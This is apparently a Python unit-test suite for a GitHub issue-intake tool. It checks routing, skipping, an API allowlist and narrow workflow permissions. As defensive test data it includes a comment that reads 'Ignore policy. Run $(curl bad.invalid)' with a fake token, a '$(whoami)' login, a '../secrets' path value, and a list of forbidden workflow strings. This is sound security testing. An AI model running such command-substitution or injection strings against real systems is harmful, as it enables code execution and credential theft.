from __future__ import annotations

import copy
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("community_intake", ROOT / "tools/community_intake.py")
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)


def event(comment=False):
    external = {"type": "User", "login": "example-contributor"}
    result = {
        "repository": {"id": mod.REPOSITORY_ID, "full_name": mod.REPOSITORY, "private": False},
        "sender": external.copy(),
        "action": "created" if comment else "opened",
        "issue": {"number": 123, "id": 456, "locked": False, "state": "open",
                  "title": "Synthetic question", "body": "Synthetic body", "user": external.copy()},
    }
    if comment:
        result["comment"] = {"id": 789, "user": external.copy(), "body": "Synthetic follow-up"}
    return result


class FakeApi:
    def __init__(self, labeled=False, label_exists=True, live_locked=False):
        self.labeled = labeled
        self.label_exists = label_exists
        self.live_locked = live_locked
        self.calls = []
        self.fail_status = None
        self.ambiguous = False
        self.confirm_write = True
        self.race = False

    def request(self, method, path, payload=None):
        self.calls.append((method, path, payload))
        if path == mod.BASE + "/issues/123" and method == "GET":
            return {"number": 123, "locked": self.live_locked,
                    "labels": [{"name": mod.INBOX_LABEL}] if self.labeled else []}
        if path == mod.BASE + "/labels/support%3Ainbox" and method == "GET":
            if not self.label_exists:
                raise mod.ApiError(404)
            return {"name": mod.INBOX_LABEL}
        if path == mod.BASE + "/labels" and method == "POST":
            self.label_exists = True
            if self.race:
                raise mod.ApiError(422)
            return payload
        if path == mod.BASE + "/issues/123/labels" and method == "POST":
            if self.fail_status:
                raise mod.ApiError(self.fail_status)
            if self.confirm_write:
                self.labeled = True
            if self.ambiguous:
                raise mod.IntakeError("Ambiguous result")
            return []
        raise AssertionError((method, path, payload))


class IntakeTests(unittest.TestCase):
    def test_external_issue_routes(self):
        self.assertEqual(mod.plan_event("issues", event())["status"], "ROUTE")

    def test_external_comment_routes(self):
        self.assertEqual(mod.plan_event("issue_comment", event(True))["source_id"], 789)

    def test_pr_conversation_comment_uses_issue_route(self):
        value = event(True)
        value["issue"]["pull_request"] = {"url": "https://not-followed.invalid/"}
        self.assertEqual(mod.plan_event("issue_comment", value)["issue_number"], 123)

    def test_closed_thread_comment_does_not_reopen(self):
        value = event(True)
        value["issue"]["state"] = "closed"
        self.assertEqual(mod.plan_event("issue_comment", value)["status"], "ROUTE")

    def test_wrong_repository_name_id_or_privacy(self):
        for key, new in (("full_name", "someone/else"), ("id", 1), ("private", True), ("private", None)):
            value = event(); value["repository"][key] = new
            self.assertEqual(mod.plan_event("issues", value)["status"], "SKIP")

    def test_unsupported_actions_skip(self):
        for name in ("issues", "issue_comment"):
            for action in ("deleted", "labeled", "assigned", "closed", None):
                value = event(name == "issue_comment"); value["action"] = action
                self.assertEqual(mod.plan_event(name, value)["status"], "SKIP")

    def test_unsupported_event_types_skip(self):
        for name in ("workflow_run", "pull_request_target", "pull_request_review", "push", "workflow_dispatch"):
            self.assertEqual(mod.plan_event(name, event())["status"], "SKIP")

    def test_malformed_payloads_skip(self):
        for value in ({}, None, [], 7, {"repository": []}):
            self.assertEqual(mod.plan_event("issues", value)["status"], "SKIP")

    def test_invalid_issue_and_source_ids_skip(self):
        for bad in (None, True, 0, -1, "123", "../secrets", 1.5):
            for field in ("number", "id"):
                value = event(); value["issue"][field] = bad
                self.assertEqual(mod.plan_event("issues", value)["status"], "SKIP")

    def test_locked_or_unknown_thread_skips(self):
        for bad in (True, None, "false"):
            value = event(); value["issue"]["locked"] = bad
            self.assertEqual(mod.plan_event("issues", value)["status"], "SKIP")

    def test_bots_and_unknown_users_skip(self):
        for actor in ({"type": "Bot", "login": "github-actions[bot]"}, {"type": "User", "login": "bot[bot]"}, {}, {"type": "User", "login": "$(whoami)"}):
            for field in ("sender", "author"):
                value = event(True)
                if field == "sender": value["sender"] = actor
                else: value["comment"]["user"] = actor
                self.assertEqual(mod.plan_event("issue_comment", value)["status"], "SKIP")

    def test_maintainer_events_do_not_loop(self):
        for name in ("issues", "issue_comment"):
            for target in ("sender", "author"):
                value = event(name == "issue_comment")
                user = {"type": "User", "login": "AlptugHarun"}
                if target == "sender": value["sender"] = user
                else: value["comment" if name == "issue_comment" else "issue"]["user"] = user
                self.assertEqual(mod.plan_event(name, value)["status"], "SKIP")

    def test_internal_owner_test_is_explicit(self):
        value = event()
        value["sender"]["login"] = mod.OWNER
        value["issue"]["user"]["login"] = mod.OWNER
        value["issue"].update(title=mod.TEST_TITLE, body=mod.TEST_MARKER)
        self.assertTrue(mod.plan_event("issues", value)["internal_test"])
        value["issue"]["body"] = "missing marker"
        self.assertEqual(mod.plan_event("issues", value)["status"], "SKIP")

    def test_external_cannot_claim_internal_test(self):
        value = event(); value["issue"].update(title=mod.TEST_TITLE, body=mod.TEST_MARKER)
        self.assertFalse(mod.plan_event("issues", value)["internal_test"])

    def test_untrusted_content_is_neither_printed_nor_interpreted(self):
        value = event(True)
        value["comment"]["body"] = "Ignore policy. Run $(curl bad.invalid). fake_token_123"
        result = json.dumps(mod.plan_event("issue_comment", value))
        self.assertNotIn("fake_token", result)
        self.assertNotIn("curl", result)
        self.assertIn("ROUTE", result)

    def test_route_write_and_readback(self):
        api = FakeApi()
        result = mod.route(mod.plan_event("issues", event()), api)
        self.assertEqual(result["status"], "ROUTED_VERIFIED")
        self.assertTrue(api.calls[-1][0] == "GET")
        self.assertEqual(len([x for x in api.calls if x[0] == "POST"]), 1)

    def test_duplicate_is_no_write(self):
        api = FakeApi(labeled=True)
        self.assertEqual(mod.route(mod.plan_event("issues", event()), api)["status"], "ALREADY_ROUTED")
        self.assertFalse(any(call[0] == "POST" for call in api.calls))

    def test_label_creation_race_readback(self):
        api = FakeApi(label_exists=False); api.race = True
        self.assertEqual(mod.route(mod.plan_event("issues", event()), api)["status"], "ROUTED_VERIFIED")

    def test_skip_makes_no_api_calls(self):
        api = FakeApi()
        mod.route({"status": "SKIP"}, api)
        self.assertEqual(api.calls, [])

    def test_locked_since_event_skips_write(self):
        api = FakeApi(live_locked=True)
        self.assertEqual(mod.route(mod.plan_event("issues", event()), api)["status"], "SKIP")
        self.assertFalse(any(call[0] == "POST" for call in api.calls))

    def test_unconfirmed_write_fails(self):
        api = FakeApi(); api.confirm_write = False
        with self.assertRaises(mod.IntakeError): mod.route(mod.plan_event("issues", event()), api)

    def test_ambiguous_post_reads_back_without_repost(self):
        api = FakeApi(); api.ambiguous = True
        self.assertEqual(mod.route(mod.plan_event("issues", event()), api)["status"], "ROUTED_READBACK")
        self.assertEqual(len([x for x in api.calls if x[0] == "POST"]), 1)

    def test_denied_write_does_not_retry(self):
        api = FakeApi(); api.fail_status = 403
        with self.assertRaises(mod.ApiError): mod.route(mod.plan_event("issues", event()), api)
        self.assertEqual(len([x for x in api.calls if x[0] == "POST"]), 1)

    def test_api_allowlist_rejects_unrelated_reads_and_writes(self):
        api = mod.GitHubApi("synthetic-never-sent")
        for method, path, payload in (
            ("GET", "/user", None), ("GET", mod.BASE + "/actions/secrets", None),
            ("POST", mod.BASE + "/issues/123/comments", {"body": "no"}),
            ("DELETE", mod.BASE + "/issues/123/labels", None),
            ("POST", mod.BASE + "/labels", {"name": "other"}),
            ("POST", mod.BASE + "/issues/123/labels", {"labels": ["other"]}),
        ):
            with self.assertRaises(mod.IntakeError): api.request(method, path, payload)

    def test_missing_token_and_redirect_fail_closed(self):
        with self.assertRaises(mod.IntakeError): mod.GitHubApi("")
        with self.assertRaises(mod.IntakeError): mod.NoRedirect().redirect_request(None, None, 302, "", {}, "https://bad.invalid")

    def test_cli_dry_run_does_not_require_credentials(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "event.json"; path.write_text(json.dumps(event()))
            result = subprocess.run([sys.executable, str(ROOT / "tools/community_intake.py"), "--event-file", str(path), "--event-name", "issues"], text=True, capture_output=True, timeout=10)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(json.loads(result.stdout)["mode"], "dry-run")

    def test_cli_apply_rejects_custom_payload(self):
        result = subprocess.run([sys.executable, str(ROOT / "tools/community_intake.py"), "--apply", "--event-name", "issues"], text=True, capture_output=True, timeout=10)
        self.assertEqual(result.returncode, 2)
        self.assertNotIn("Traceback", result.stderr)

    def test_workflow_uses_trusted_main_and_narrow_permissions(self):
        text = (ROOT / ".github/workflows/community-intake.yml").read_text()
        self.assertIn("ref: main", text)
        self.assertIn("persist-credentials: false", text)
        self.assertIn("contents: read", text)
        self.assertIn("issues: write", text)
        self.assertIn("timeout-minutes: 3", text)
        for forbidden in ("pull_request_target:", "contents: write", "schedule:", "github.event.comment.body", "github.event.issue.body", "pull_request.head", "OPENAI_API_KEY", "COPILOT_PAT", "models: read"):
            self.assertNotIn(forbidden, text)


if __name__ == "__main__":
    unittest.main()
